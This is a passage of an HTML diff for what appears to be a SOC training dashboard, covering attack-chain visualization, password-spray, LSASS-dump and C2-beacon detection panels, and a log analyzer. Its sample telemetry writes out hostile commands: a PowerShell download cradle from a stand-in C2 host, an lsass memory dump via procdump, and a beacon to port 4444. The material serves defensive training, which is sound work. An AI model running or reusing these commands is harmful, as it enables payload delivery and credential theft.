+            <div class="detail-subtab-content" id="subtab-remediation">
+              <div class="remediation-checklist">
+                <h4 class="subtab-h4">NIST 800-61 Incident Handling Checklist</h4>
+                <div class="check-item">
+                  <input type="checkbox" id="chk-1" checked>
+                  <label for="chk-1"><strong>Isolate Host:</strong> Terminate active network adapter for `FIN-WS-09` via EDR API.</label>
+                </div>
+                <div class="check-item">
+                  <input type="checkbox" id="chk-2" checked>
+                  <label for="chk-2"><strong>Revoke Credentials:</strong> Reset password and invalidate Active Directory Kerberos TGT for `CORP\cjohnson`.</label>
+                </div>
+                <div class="check-item">
+                  <input type="checkbox" id="chk-3">
+                  <label for="chk-3"><strong>Block External Infrastructure:</strong> Push perimeter firewall block for IP `198.51.100.45` and `185.220.101.5`.</label>
+                </div>
+                <div class="check-item">
+                  <input type="checkbox" id="chk-4">
+                  <label for="chk-4"><strong>Forensic Image & Wipe:</strong> Collect memory snapshot for IR forensics and initiate re-imaging pipeline.</label>
+                </div>
+              </div>
+            </div>
+
+          </div>
+        </div>
+      </section>
+
+      <!-- =================================================================== -->
+      <!-- TAB 4: PROCESS TREE & KILL CHAIN VISUALIZER -->
+      <!-- =================================================================== -->
+      <section class="tab-pane" id="process-tree-dashboard">
+        <!-- Interactive Help Box -->
+        <div class="help-box" id="help-processtree">
+          <div class="help-header">
+            <div class="help-title">
+              <span class="help-icon">💡</span>
+              <strong>First-Time Guide: Process Hierarchy & LOLBins Detection</strong>
+            </div>
+            <button class="btn-hide-help" onclick="toggleHelpBox('help-processtree')">Hide ✕</button>
+          </div>
+          <div class="help-body">
+            <div class="help-step-item">
+              <span class="step-num">1</span>
+              <span><strong>Living-off-the-Land:</strong> Attackers abuse legitimate Windows binaries (PowerShell, Word) rather than creating new malware files.</span>
+            </div>
+            <div class="help-step-item">
+              <span class="step-num">2</span>
+              <span><strong>Parent-Child Tracking:</strong> Sysmon Event ID 1 correlates parent `WINWORD.EXE` creating child `powershell.exe` to expose hidden execution.</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="glass-panel">
+          <div class="panel-header">
+            <div class="panel-title">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
+              <span>Endpoint Process Hierarchy & Living-Off-The-Land (Sysmon ID 1 / Event 4104)</span>
+            </div>
+            <span class="panel-badge highlight-red">Host: FIN-WS-09.CORP.LOCAL</span>
+          </div>
+
+          <div class="process-tree-container">
+            <div class="process-node level-0">
+              <div class="node-badge">PARENT PROCESS</div>
+              <div class="node-card">
+                <div class="node-main">
+                  <span class="process-icon">📄</span>
+                  <div class="node-info">
+                    <span class="process-name">WINWORD.EXE (PID: 4120)</span>
+                    <span class="process-cmd">"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\cjohnson\Downloads\Q2_Financial_Invoice_Update.docm"</span>
+                  </div>
+                </div>
+                <span class="node-status text-amber">Initial Execution</span>
+              </div>
+            </div>
+
+            <div class="tree-connector-line"></div>
+
+            <div class="process-node level-1">
+              <div class="node-badge bg-danger">SPAWNED SCRIPT INTERPRETER (T1059.001)</div>
+              <div class="node-card border-red">
+                <div class="node-main">
+                  <span class="process-icon">💻</span>
+                  <div class="node-info">
+                    <span class="process-name">powershell.exe (PID: 8944)</span>
+                    <span class="process-cmd">powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Enc SQBFAFgAIAAoAE4AZQB3...</span>
+                    <div class="deobfuscated-preview">
+                      <strong>De-obfuscated ScriptBlock (Event 4104):</strong>
+                      <code>IEX (New-Object Net.WebClient).DownloadString('http://c2-threat.lab/stage2.ps1'); [System.Reflection.Assembly]::Load($payload);</code>
+                    </div>
+                  </div>
+                </div>
+                <span class="node-status text-red">MALICIOUS LOLBIN</span>
+              </div>
+            </div>
+
+            <div class="tree-connector-line"></div>
+
+            <div class="process-node level-2">
+              <div class="node-badge bg-danger">CREDENTIAL DUMPING UTILITY (T1003.001)</div>
+              <div class="node-card border-red">
+                <div class="node-main">
+                  <span class="process-icon">⚠️</span>
+                  <div class="node-info">
+                    <span class="process-name">procdump64.exe (PID: 9812)</span>
+                    <span class="process-cmd">C:\Windows\Temp\procdump64.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp</span>
+                    <div class="deobfuscated-preview">
+                      <strong>Sysmon Event ID 10:</strong>
+                      <code>TargetImage: C:\Windows\System32\lsass.exe | GrantedAccess: 0x1fffff | Staged: C:\Windows\Temp\lsass.dmp</code>
+                    </div>
+                  </div>
+                </div>
+                <span class="node-status text-red">CRITICAL CREDENTIAL ACCESS</span>
+              </div>
+            </div>
+
+            <div class="tree-connector-line"></div>
+
+            <div class="process-node level-3">
+              <div class="node-badge bg-purple">COMMAND & CONTROL BEACON (T1071.001)</div>
+              <div class="node-card border-purple">
+                <div class="node-main">
+                  <span class="process-icon">📡</span>
+                  <div class="node-info">
+                    <span class="process-name">beacon.exe (PID: 10120)</span>
+                    <span class="process-cmd">C:\Windows\Temp\beacon.exe -server 185.220.101.5:4444 -interval 30s -jitter 0%</span>
+                  </div>
+                </div>
+                <span class="node-status text-purple">PERSISTENT C2 CHANNEL</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- =================================================================== -->
+      <!-- TAB 5: 4625 BRUTE FORCE & PASSWORD SPRAY DASHBOARD -->
+      <!-- =================================================================== -->
+      <section class="tab-pane" id="brute-force-dashboard">
+        <!-- Interactive Help Box -->
+        <div class="help-box" id="help-bruteforce">
+          <div class="help-header">
+            <div class="help-title">
+              <span class="help-icon">💡</span>
+              <strong>First-Time Guide: Differentiating Brute Force from Password Spraying</strong>
+            </div>
+            <button class="btn-hide-help" onclick="toggleHelpBox('help-bruteforce')">Hide ✕</button>
+          </div>
+          <div class="help-body">
+            <div class="help-step-item">
+              <span class="step-num">1</span>
+              <span><strong>Brute Force:</strong> 1 single account targeted with 50+ passwords (high lockout risk).</span>
+            </div>
+            <div class="help-step-item">
+              <span class="step-num">2</span>
+              <span><strong>Password Spraying:</strong> 1 common password tried across 50+ distinct users (`dc(TargetUserName) >= 5`) to evade single-user lockouts.</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="glass-panel">
+          <div class="panel-header">
+            <div class="panel-title">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+              <span>Windows Authentication Anomaly Dashboard (Event ID 4625 / 4624)</span>
+            </div>
+            <span class="panel-badge highlight-amber">Target: DC01.CORP.LOCAL</span>
+          </div>
+
+          <div class="grid-3col mb-4">
+            <div class="kpi-card">
+              <div class="kpi-header"><span class="kpi-title">ATTACKER IP</span></div>
+              <div class="kpi-value text-red">198.51.100.45</div>
+              <div class="kpi-trend">Host: KALI-ATTACKER</div>
+            </div>
+            <div class="kpi-card">
+              <div class="kpi-header"><span class="kpi-title">TOTAL FAILED ATTEMPTS</span></div>
+              <div class="kpi-value text-amber">11 Attempts</div>
+              <div class="kpi-trend">Velocity: 11 / 40 seconds</div>
+            </div>
+            <div class="kpi-card">
+              <div class="kpi-header"><span class="kpi-title">DISTINCT TARGET ACCOUNTS</span></div>
+              <div class="kpi-value text-cyan">8 Usernames</div>
+              <div class="kpi-trend text-red">1 Successful Breach (cjohnson)</div>
+            </div>
+          </div>
+
+          <!-- Failed vs Successful Auth Timeline -->
+          <div class="auth-timeline-box">
+            <h4 class="subtab-h4">Password Spray Timeline & Correlated Compromise</h4>
+            <div class="spray-timeline" id="spray-timeline-container">
+              <!-- Rendered via JS -->
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- =================================================================== -->
+      <!-- TAB 6: LSASS CREDENTIAL ACCESS DASHBOARD -->
+      <!-- =================================================================== -->
+      <section class="tab-pane" id="lsass-credential-dashboard">
+        <!-- Interactive Help Box -->
+        <div class="help-box" id="help-lsass">
+          <div class="help-header">
+            <div class="help-title">
+              <span class="help-icon">💡</span>
+              <strong>First-Time Guide: LSASS Memory Dumping Forensics</strong>
+            </div>
+            <button class="btn-hide-help" onclick="toggleHelpBox('help-lsass')">Hide ✕</button>
+          </div>
+          <div class="help-body">
+            <div class="help-step-item">
+              <span class="step-num">1</span>
+              <span><strong>Why Sysmon 10:</strong> Captures direct process handles opened to `lsass.exe` with memory read rights (`0x1fffff`) before hashes can be cracked offline.</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="glass-panel">
+          <div class="panel-header">
+            <div class="panel-title">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 2l-2 2m-1-1l-3 3m1 1l-2 2m-1-1l-4 4a5 5 0 1 1-7-7l4-4m1 1l2-2m-1-1l3-3m1 1l2-2"/></svg>
+              <span>LSASS Memory Access Forensics (Sysmon Event ID 10 & 11)</span>
+            </div>
+            <span class="panel-badge highlight-red">Target: lsass.exe (PID 648)</span>
+          </div>
+
+          <div class="grid-2col">
+            <div class="forensic-subpanel">
+              <h4 class="subtab-h4">Sysmon Event 10: ProcessAccess Telemetry</h4>
+              <div class="field-list">
+                <div class="field-item">
+                  <span class="field-label">Target Image:</span>
+                  <span class="field-value">C:\Windows\System32\lsass.exe</span>
+                </div>
+                <div class="field-item">
+                  <span class="field-label">Source Image:</span>
+                  <span class="field-value text-red">C:\Windows\Temp\procdump64.exe</span>
+                </div>
+                <div class="field-item">
+                  <span class="field-label">Granted Access:</span>
+                  <span class="field-value text-red font-mono">0x1fffff (PROCESS_ALL_ACCESS)</span>
+                </div>
+                <div class="field-item">
+                  <span class="field-label">Call Trace:</span>
+                  <span class="field-value font-mono">ntdll.dll+9d454 | KERNELBASE.dll+3af1d | procdump64.exe+7b12</span>
+                </div>
+              </div>
+            </div>
+
+            <div class="forensic-subpanel">
+              <h4 class="subtab-h4">Sysmon Event 11: Dump File Creation</h4>
+              <div class="field-list">
+                <div class="field-item">
+                  <span class="field-label">Target File Name:</span>
+                  <span class="field-value text-red">C:\Windows\Temp\lsass.dmp</span>
+                </div>
+                <div class="field-item">
+                  <span class="field-label">Creating User:</span>
+                  <span class="field-value">CORP\cjohnson</span>
+                </div>
+                <div class="field-item">
+                  <span class="field-label">Creation UTC Time:</span>
+                  <span class="field-value font-mono">2026-04-18 15:12:09.112 UTC</span>
+                </div>
+                <div class="field-item">
+                  <span class="field-label">Recommended Containment:</span>
+                  <span class="field-value text-amber">Immediate Krbtgt Double Reset + Host Re-image</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- =================================================================== -->
+      <!-- TAB 7: C2 NETWORK BEACONING MONITOR -->
+      <!-- =================================================================== -->
+      <section class="tab-pane" id="network-beacon-dashboard">
+        <!-- Interactive Help Box -->
+        <div class="help-box" id="help-beacon">
+          <div class="help-header">
+            <div class="help-title">
+              <span class="help-icon">💡</span>
+              <strong>First-Time Guide: Detecting Hardcoded C2 Heartbeats & Jitter</strong>
+            </div>
+            <button class="btn-hide-help" onclick="toggleHelpBox('help-beacon')">Hide ✕</button>
+          </div>
+          <div class="help-body">
+            <div class="help-step-item">
+              <span class="step-num">1</span>
+              <span><strong>Periodic Connection Deltas:</strong> Standard web browsing is bursty and random. When an outbound socket fires at an exact fixed interval (30.00s &plusmn; 0.1s), an automated malware agent is active.</span>
+            </div>
+            <div class="help-step-item">
+              <span class="step-num">2</span>
+              <span><strong>Splunk Detection Math:</strong> Evaluated using <code>streamstats current=f window=1 delta(_time) as delta_t</code> to calculate mean intervals and standard deviation jitter.</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="glass-panel">
+          <div class="panel-header">
+            <div class="panel-title">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>
+              <span>Outbound C2 Network Beaconing Correlation (Sysmon ID 3 & Zeek Conn)</span>
+            </div>
+            <span class="panel-badge highlight-purple">Periodic Beacon Detected</span>
+          </div>
+
+          <div class="grid-3col mb-4">
+            <div class="kpi-card">
+              <div class="kpi-header"><span class="kpi-title">DESTINATION C2 IP</span></div>
+              <div class="kpi-value text-purple">185.220.101.5</div>
+              <div class="kpi-trend">Domain: c2-threat.lab (Port 4444)</div>
+            </div>
+            <div class="kpi-card">
+              <div class="kpi-header"><span class="kpi-title">BEACON INTERVAL</span></div>
+              <div class="kpi-value text-cyan">30.00s Average</div>
+              <div class="kpi-trend">Streamstats Delta: 30s &plusmn; 0.1s</div>
+            </div>
+            <div class="kpi-card">
+              <div class="kpi-header"><span class="kpi-title">JITTER / VARIANCE</span></div>
+              <div class="kpi-value text-green">0.00s (Hardcoded)</div>
+              <div class="kpi-trend text-red">High-Confidence Automated Agent</div>
+            </div>
+          </div>
+
+          <div class="table-responsive">
+            <table class="soc-table">
+              <thead>
+                <tr>
+                  <th>Timestamp (UTC)</th>
+                  <th>Source Endpoint</th>
+                  <th>Source Port</th>
+                  <th>Destination IP:Port</th>
+                  <th>Binary Name</th>
+                  <th>Interval Delta</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td class="font-mono">2026-04-18 15:16:01</td>
+                  <td>FIN-WS-09 (192.168.10.42)</td>
+                  <td>49201</td>
+                  <td class="text-purple font-mono">185.220.101.5:4444</td>
+                  <td><code>beacon.exe</code></td>
+                  <td>Initial Connection</td>
+                </tr>
+                <tr>
+                  <td class="font-mono">2026-04-18 15:16:31</td>
+                  <td>FIN-WS-09 (192.168.10.42)</td>
+                  <td>49204</td>
+                  <td class="text-purple font-mono">185.220.101.5:4444</td>
+                  <td><code>beacon.exe</code></td>
+                  <td class="text-cyan font-bold">+30.00s</td>
+                </tr>
+                <tr>
+                  <td class="font-mono">2026-04-18 15:17:01</td>
+                  <td>FIN-WS-09 (192.168.10.42)</td>
+                  <td>49208</td>
+                  <td class="text-purple font-mono">185.220.101.5:4444</td>
+                  <td><code>beacon.exe</code></td>
+                  <td class="text-cyan font-bold">+30.00s</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </section>
+
+      <!-- =================================================================== -->
+      <!-- TAB 8: MITRE ATT&CK ENTERPRISE MATRIX NAVIGATOR -->
+      <!-- =================================================================== -->
+      <section class="tab-pane" id="mitre-matrix-view">
+        <!-- Interactive Help Box -->
+        <div class="help-box" id="help-mitre">
+          <div class="help-header">
+            <div class="help-title">
+              <span class="help-icon">💡</span>
+              <strong>First-Time Guide: MITRE ATT&CK Matrix Coverage & Kill Chain Mapping</strong>
+            </div>
+            <button class="btn-hide-help" onclick="toggleHelpBox('help-mitre')">Hide ✕</button>
+          </div>
+          <div class="help-body">
+            <div class="help-step-item">
+              <span class="step-num">1</span>
+              <span><strong>Tactics Progression:</strong> Columns represent adversary stages from left to right (Initial Access &rarr; Execution &rarr; Defense Evasion &rarr; Credential Access &rarr; Command & Control).</span>
+            </div>
+            <div class="help-step-item">
+              <span class="step-num">2</span>
+              <span><strong>Active Rule Badges:</strong> Click any highlighted green badge (e.g. <code>T1110.003</code> or <code>T1003.001</code>) to jump directly to the underlying Splunk correlation rule and Sigma YAML definition.</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="glass-panel">
+          <div class="panel-header">
+            <div class="panel-title">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="m4.93 4.93 4.24 4.24"/><path d="m14.83 9.17 4.24-4.24"/><path d="m14.83 14.83 4.24 4.24"/><path d="m9.17 14.83-4.24 4.24"/></svg>
+              <span>MITRE ATT&CK v14 Enterprise Heatmap (Detected Techniques Highlighted)</span>
+            </div>
+            <span class="panel-badge highlight-cyan">6 Techniques Active</span>
+          </div>
+
+          <div class="mitre-matrix-grid" id="mitre-matrix-grid">
+            <!-- Dynamically populated MITRE Columns -->
+          </div>
+        </div>
+      </section>
+
+      <!-- =================================================================== -->
+      <!-- TAB 9: FALSE POSITIVE TUNING SANDBOX -->
+      <!-- =================================================================== -->
+      <section class="tab-pane" id="fp-tuning-sandbox">
+        <!-- Interactive Help Box -->
+        <div class="help-box" id="help-tuning">
+          <div class="help-header">
+            <div class="help-title">
+              <span class="help-icon">💡</span>
+              <strong>First-Time Guide: The Engineering Behind the 35.2% Noise Reduction</strong>
+            </div>
+            <button class="btn-hide-help" onclick="toggleHelpBox('help-tuning')">Hide ✕</button>
+          </div>
+          <div class="help-body">
+            <div class="help-step-item">
+              <span class="step-num">1</span>
+              <span><strong>Interactive Controls:</strong> Drag the threshold slider or toggle service account lookups on/off.</span>
+            </div>
+            <div class="help-step-item">
+              <span class="step-num">2</span>
+              <span><strong>Observe Real-Time Impact:</strong> Watch how alert volume drops from 1,420 to 920/week while maintaining high fidelity!</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="glass-panel">
+          <div class="panel-header">
+            <div class="panel-title">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="4" y1="21" x2="4" y2="14"/><line x1="4" y1="10" x2="4" y2="3"/><line x1="12" y1="21" x2="12" y2="12"/><line x1="12" y1="8" x2="12" y2="3"/><line x1="20" y1="21" x2="20" y2="16"/><line x1="20" y1="12" x2="20" y2="3"/><line x1="1" y1="14" x2="7" y2="14"/><line x1="9" y1="8" x2="15" y2="8"/><line x1="17" y1="16" x2="23" y2="16"/></svg>
+              <span>Interactive Detection Rule Tuning & False Positive Reduction Simulator</span>
+            </div>
+            <span class="panel-badge highlight-green">Tuning Simulator</span>
+          </div>
+
+          <div class="grid-2col">
+            <!-- Left Controls -->
+            <div class="tuning-controls-box">
+              <h4 class="subtab-h4">Threshold & Whitelist Parameters</h4>
+              
+              <div class="slider-group">
+                <div class="slider-header">
+                  <span>Failed Attempts Threshold (Event 4625):</span>
+                  <span class="slider-val text-cyan" id="val-threshold">10 attempts</span>
+                </div>
+                <input type="range" id="slider-threshold" min="3" max="30" value="10" class="soc-slider">
+              </div>
+
+              <div class="slider-group mt-3">
+                <div class="slider-header">
+                  <span>Time Aggregation Window:</span>
+                  <span class="slider-val text-cyan" id="val-timewindow">60 seconds</span>
+                </div>
+                <input type="range" id="slider-timewindow" min="15" max="300" step="15" value="60" class="soc-slider">
+              </div>
+
+              <div class="toggle-group mt-4">
+                <label class="toggle-switch">
+                  <input type="checkbox" id="toggle-whitelist" checked>
+                  <span class="toggle-slider"></span>
+                </label>
+                <div class="toggle-text">
+                  <strong>Enable `known_admin_service_accounts.csv` Whitelist</strong>
+                  <p>Filters out automated backup agents, vulnerability scanners & SCCM heartbeats.</p>
+                </div>
+              </div>
+
+              <div class="toggle-group mt-3">
+                <label class="toggle-switch">
+                  <input type="checkbox" id="toggle-machine-accounts" checked>
+                  <span class="toggle-slider"></span>
+                </label>
+                <div class="toggle-text">
+                  <strong>Filter Machine Accounts (`*$`)</strong>
+                  <p>Suppresses background domain workstation Kerberos sync noise.</p>
+                </div>
+              </div>
+            </div>
+
+            <!-- Right Real-Time Simulation Feedback -->
+            <div class="tuning-sim-results">
+              <h4 class="subtab-h4">Simulated Production Impact</h4>
+              
+              <div class="sim-metric-card">
+                <div class="sim-metric-title">Estimated Weekly Alert Volume</div>
+                <div class="sim-metric-val" id="sim-alert-volume">920 alerts / week</div>
+                <div class="sim-metric-diff text-green" id="sim-reduction-pct">-35.2% Noise Reduction</div>
+              </div>
+
+              <div class="sim-metric-grid mt-3">
+                <div class="tune-box">
+                  <span class="tune-num text-green" id="sim-fpr">13.4%</span>
+                  <span class="tune-lbl">False Positive Rate</span>
+                </div>
+                <div class="tune-box">
+                  <span class="tune-num text-cyan" id="sim-mttt">4.1 min</span>
+                  <span class="tune-lbl">Avg Triage Time</span>
+                </div>
+              </div>
+
+              <div class="tuning-verdict mt-3" id="sim-verdict">
+                <span class="verdict-icon">✅</span>
+                <span>Optimal Balance: Maximum true-positive capture with 35.2% alert noise suppression.</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- =================================================================== -->
+      <!-- TAB 10: CUSTOM LOG INGEST & AUTOMATED THREAT ANALYZER -->
+      <!-- =================================================================== -->
+      <section class="tab-pane" id="log-uploader-analyzer">
+        <div class="glass-panel">
+          <div class="panel-header">
+            <div class="panel-title">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+              <span>Custom Log Ingest & Automated Threat Analyzer (Fresher-Friendly Diagnostics)</span>
+            </div>
+            <span class="panel-badge highlight-green" id="analyzer-status-badge">Ready for Ingest</span>
+          </div>
+
+          <!-- Fresher Help Guide -->
+          <div class="help-box" id="help-analyzer-box">
+            <div class="help-header">
+              <div class="help-title">
+                <span>💡</span>
+                <strong>Fresher & Analyst Quick Guide: How to Spot What is Wrong in Logs</strong>
+              </div>
+              <button class="btn-hide-help" onclick="toggleHelpBox('help-analyzer-box')">Hide &times;</button>
+            </div>
+            <div class="help-body">
+              <div class="help-step-item">
+                <span class="step-num">1</span>
+                <span><strong>Ingest Any File:</strong> Drag & drop your raw log file (<code class="font-mono text-cyan">.json</code>, <code class="font-mono text-cyan">.log</code>, <code class="font-mono text-cyan">.csv</code>, <code class="font-mono text-cyan">.txt</code>) or click one of the pre-loaded attack scenario buttons below.</span>
+              </div>
+              <div class="help-step-item">
+                <span class="step-num">2</span>
+                <span><strong>Automated IP Frequency Tracking:</strong> If an external IP repeats failed logins across multiple users within seconds, it is automatically highlighted with <span class="badge-repeated-ip">⚠️ REPEATED ATTACK IP</span> to prevent missing credential sprays.</span>
+              </div>
+              <div class="help-step-item">
+                <span class="step-num">3</span>
+                <span><strong>Suspicious Path & Parent-Child Flags:</strong> Executables running out of staging folders (<code class="font-mono text-cyan">C:\Windows\Temp\</code>) or Office spawning shells (<code class="font-mono text-cyan">WINWORD.EXE &rarr; powershell.exe</code>) are flagged in plain English with MITRE techniques and remediation steps.</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- File Upload Zone & Quick Sample Loaders -->
+          <div class="upload-zone-container mb-4">
+            <div class="drop-zone" id="log-drop-zone">
+              <input type="file" id="log-file-input" accept=".json,.log,.csv,.txt" style="display: none;">
+              <div class="drop-zone-icon">
+                <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+              </div>
+              <div class="drop-zone-text">
+                <strong>Drag & drop any security log file here</strong>, or <span class="drop-zone-browse">browse from computer</span>
+              </div>
+              <div class="drop-zone-sub">Supports Windows Security (4625/4624), Sysmon (1/3/10), PowerShell (4104), and Zeek JSON logs</div>
+              <div class="ingest-live-banner" id="ingest-live-banner">
+                <span class="status-dot pulse-green"></span>
+                <span id="ingest-live-status-text">Active Telemetry: 15 events loaded | 4 threats flagged</span>
+              </div>
+            </div>
+
+            <div class="quick-samples-bar mt-3">
+              <span class="quick-samples-label">⚡ 1-Click Attack Scenarios:</span>
+              <button class="btn-sample-load" id="btn-load-sample-spray">Password Spraying (4625)</button>
+              <button class="btn-sample-load" id="btn-load-sample-macro">Malicious Macro & PowerShell (4104)</button>
+              <button class="btn-sample-load" id="btn-load-sample-sysmon">LSASS Dump & C2 Beacon (Sysmon 10/3)</button>
+              <button class="btn-sample-load active" id="btn-load-sample-all">Full Multi-Stage Attack Chain</button>
+            </div>
+          </div>
+
+          <!-- Practice Log Library & Telemetry Repository -->
+          <div class="practice-logs-panel mb-4">
+            <div class="practice-logs-header">
+              <div style="display: flex; align-items: center; gap: 0.5rem; flex-wrap: wrap;">
+                <span class="font-bold text-cyan" style="font-size: 0.82rem;">📂 Practice Log Library & Repository (<code class="font-mono">datasets/practice_logs/</code>)</span>
+                <span class="badge-tag">5 Built-in Practice Logs</span>
+              </div>
+              <span class="text-dim" style="font-size: 0.72rem;">Click any scenario to load telemetry and synchronize all SOC dashboards</span>
+            </div>
+            <div class="practice-logs-grid mt-2" id="practice-logs-grid">
+              <div class="practice-file-card" onclick="loadPracticeFile('1_password_spray_attack.log')">
+                <div class="practice-file-icon">📄</div>
+                <div class="practice-file-info">
+                  <div class="practice-file-name font-mono">1_password_spray_attack.log</div>
+                  <div class="practice-file-meta">Windows Security Event 4625 brute-force (10 attempts)</div>
+                </div>
+                <button class="btn btn-sm btn-outline-cyan">Load Telemetry</button>
+              </div>
+              <div class="practice-file-card" onclick="loadPracticeFile('2_phishing_macro_powershell.json')">
+                <div class="practice-file-icon">📄</div>
+                <div class="practice-file-info">
+                  <div class="practice-file-name font-mono">2_phishing_macro_powershell.json</div>
+                  <div class="practice-file-meta">WINWORD.EXE &rarr; powershell.exe & ScriptBlock 4104</div>
+                </div>
+                <button class="btn btn-sm btn-outline-cyan">Load Telemetry</button>
+              </div>
+              <div class="practice-file-card" onclick="loadPracticeFile('3_lsass_dump_and_c2.csv')">
+                <div class="practice-file-icon">📊</div>
+                <div class="practice-file-info">
+                  <div class="practice-file-name font-mono">3_lsass_dump_and_c2.csv</div>
+                  <div class="practice-file-meta">Sysmon 10 (0x1fffff LSASS) & Sysmon 3 (Port 4444 C2)</div>
+                </div>
+                <button class="btn btn-sm btn-outline-cyan">Load Telemetry</button>
+              </div>
+              <div class="practice-file-card" onclick="loadPracticeFile('4_multi_stage_apt_intrusion.json')">
+                <div class="practice-file-icon">📁</div>
+                <div class="practice-file-info">
+                  <div class="practice-file-name font-mono">4_multi_stage_apt_intrusion.json</div>
+                  <div class="practice-file-meta">Full 15-event multi-stage APT intrusion sequence</div>
+                </div>
+                <button class="btn btn-sm btn-outline-cyan">Load Telemetry</button>
+              </div>
+              <div class="practice-file-card" onclick="loadPracticeFile('5_normal_enterprise_baseline.log')">
+                <div class="practice-file-icon">🛡️</div>
+                <div class="practice-file-info">
+                  <div class="practice-file-name font-mono">5_normal_enterprise_baseline.log</div>
+                  <div class="practice-file-meta">Benign domain logins & audit baseline (0 threats / clean)</div>
+                </div>
+                <button class="btn btn-sm btn-outline-cyan">Load Telemetry</button>
+              </div>
+            </div>
+          </div>
+
+          <!-- Upload Progress Bar (Active for Large Files) -->
+          <div class="upload-progress-container mb-3" id="upload-progress-wrap" style="display: none;">
+            <div class="progress-bar-bg"><div class="progress-bar-fill" id="upload-progress-fill" style="width: 0%;"></div></div>
+            <div class="progress-text-row">
+              <span id="progress-status-text" class="text-cyan font-mono" style="font-size: 0.72rem;">Streaming & indexing large log file...</span>
+              <span id="progress-percent" class="text-green font-mono" style="font-size: 0.72rem; font-weight: 700;">0%</span>
+            </div>
+          </div>
+
+          <!-- Ingestion KPI Metrics & Engine Benchmark -->
+          <div class="kpi-grid mb-4">
+            <div class="kpi-card kpi-info">
+              <div class="kpi-header"><span class="kpi-title">TOTAL INGESTED EVENTS</span></div>
+              <div class="kpi-value text-cyan" id="kpi-total-ingested">15 Events</div>
+              <div class="kpi-trend" id="kpi-engine-throughput">⚡ Ingest Speed: 1.2ms (Zero Freeze)</div>
+            </div>
+            <div class="kpi-card kpi-critical">
+              <div class="kpi-header"><span class="kpi-title">REPEATED EXTERNAL IPS</span></div>
+              <div class="kpi-value text-red" id="kpi-repeated-ips">198.51.100.45</div>
+              <div class="kpi-trend text-red" id="kpi-repeated-ip-sub">10 Failed Attempts Detected (Spray)</div>
+            </div>
+            <div class="kpi-card kpi-high">
+              <div class="kpi-header"><span class="kpi-title">HIGH-RISK PATHS DETECTED</span></div>
+              <div class="kpi-value text-amber" id="kpi-risk-paths">3 Suspicious</div>
+              <div class="kpi-trend">C:\Windows\Temp\ & Base64 LOLBins</div>
+            </div>
+            <div class="kpi-card kpi-success">
+              <div class="kpi-header"><span class="kpi-title">IDENTIFIED THREAT ISSUES</span></div>
+              <div class="kpi-value text-green" id="kpi-issues-count">4 Identified</div>
+              <div class="kpi-trend">Mapped to MITRE ATT&CK Framework</div>
+            </div>
+          </div>
+
+          <!-- Automated Fresher Diagnostics: What Can Be The Issue? -->
+          <div class="threat-diagnostics-section mb-4">
+            <div class="section-badge-header mb-3">
+              <span class="badge-tag">AUTOMATED THREAT DIAGNOSTICS</span>
+              <h3 style="font-size: 1rem; font-weight: 700; color: var(--text-main); margin-top: 0.2rem;">What Is Wrong In This Log File? (Plain-English Breakdown)</h3>
+            </div>
+
+            <div class="threat-issues-grid" id="threat-issues-container">
+              <!-- Dynamically populated threat explainer cards -->
+            </div>
+          </div>
+
+          <!-- High-Speed Multi-Dimensional Filter Toolbar -->
+          <div class="analyzer-filters-panel mb-3">
+            <div class="filters-header">
+              <div style="display: flex; align-items: center; gap: 0.6rem; flex-wrap: wrap;">
+                <span class="font-bold text-cyan" style="font-size: 0.82rem;">🔍 High-Performance Multi-Field Filter Engine</span>
+                <span class="panel-badge highlight-green" id="filter-latency-pill">Index Filter Latency: &lt; 1ms</span>
+              </div>
+              <button class="btn btn-sm btn-outline" id="btn-reset-analyzer-filters">Reset All Filters</button>
+            </div>
+            
+            <div class="filters-grid mt-2">
+              <div class="filter-box">
+                <label>Text Search / Entity Query:</label>
+                <input type="text" class="soc-input" id="analyzer-search-input" placeholder="Search IP, User, Command, Host...">
+              </div>
+              <div class="filter-box">
+                <label>Time Event Window:</label>
